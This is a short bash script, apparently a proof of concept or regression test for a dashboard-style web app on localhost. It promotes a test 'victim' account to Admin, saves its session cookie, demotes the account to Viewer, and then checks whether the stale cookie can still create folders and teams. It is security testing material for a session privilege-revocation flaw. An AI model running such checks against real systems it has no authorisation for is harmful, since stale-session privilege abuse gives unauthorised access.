#!/bin/bash
P=${1:-3001}; U=http://localhost:$P; J=$(mktemp -d)
A="-u admin:adminpass"
c() { curl -s -o $J/body -w "%{http_code}" "$@"; }
login() { rm -f $J/$1; curl -s -o /dev/null -c $J/$1 -X POST $U/login -H 'content-type: application/json' -d "{\"user\":\"$1\",\"password\":\"$2\"}"; }
curl -s $A -X POST $U/api/admin/users -H 'content-type: application/json' -d '{"name":"victim","login":"victim","password":"victimpass"}' > /dev/null
VID=$(curl -s $A "$U/api/users/lookup?loginOrEmail=victim" | python3 -c 'import json,sys;print(json.load(sys.stdin)["id"])')
echo "victim id $VID; set Admin: $(c $A -X PATCH $U/api/org/users/$VID -H 'content-type: application/json' -d '{"role":"Admin"}')"
login victim victimpass; cp $J/victim $J/stale
echo "source, stale cookie, POST /api/folders: $(c -b $J/stale -X POST $U/api/folders -H 'content-type: application/json' -d '{"title":"f-'$RANDOM'"}')"
echo "source2, stale cookie, POST /api/teams: $(c -b $J/stale -X POST $U/api/teams -H 'content-type: application/json' -d '{"name":"t-'$RANDOM'"}')"
echo "transition, admin sets Viewer: $(c $A -X PATCH $U/api/org/users/$VID -H 'content-type: application/json' -d '{"role":"Viewer"}') $(cat $J/body)"
echo "follow-up, stale cookie, POST /api/folders: $(c -b $J/stale -X POST $U/api/folders -H 'content-type: application/json' -d '{"title":"f-'$RANDOM'"}') $(head -c 120 $J/body)"
echo "follow-up2, stale cookie, POST /api/teams: $(c -b $J/stale -X POST $U/api/teams -H 'content-type: application/json' -d '{"name":"t-'$RANDOM'"}') $(head -c 120 $J/body)"
login victim victimpass
echo "fresh cookie, POST /api/folders: $(c -b $J/victim -X POST $U/api/folders -H 'content-type: application/json' -d '{"title":"f-'$RANDOM'"}') $(head -c 120 $J/body)"
echo "restore Admin: $(c $A -X PATCH $U/api/org/users/$VID -H 'content-type: application/json' -d '{"role":"Admin"}')"
rm -rf $J
